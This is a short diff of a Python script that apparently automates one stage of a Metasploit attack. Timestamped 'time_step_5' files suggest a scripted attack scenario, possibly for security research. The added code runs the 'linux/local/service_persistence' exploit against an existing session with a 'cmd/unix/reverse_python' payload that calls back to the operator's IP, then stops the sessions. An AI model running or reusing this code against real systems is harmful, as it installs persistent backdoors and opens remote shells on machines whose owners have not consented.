@@ -22,18 +22,23 @@ def main(argv):
     output_time_file_start = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file_start)
     time.sleep(60)
+    
+    try:
+        exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+        exploit['SESSION'] = 2
+        exploit['VERBOSE'] = True
+        payload['LHOST'] = my_ip
 
-    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    exploit['SESSION'] = 2
-    exploit['VERBOSE'] = True
-    payload['LHOST'] = my_ip
-
-    exploit.execute(payload=payload)
+        exploit.execute(payload=payload)
 
 
-    # client.sessions.session('2').stop()
-    # client.sessions.session('3').stop()
+        client.sessions.session('2').stop()
+        client.sessions.session('3').stop()
+        
+    except Exception as e:
+        print(e)
+        pass
 
     time.sleep(30)
     output_time_file_end = 'time_step_5_end.txt'
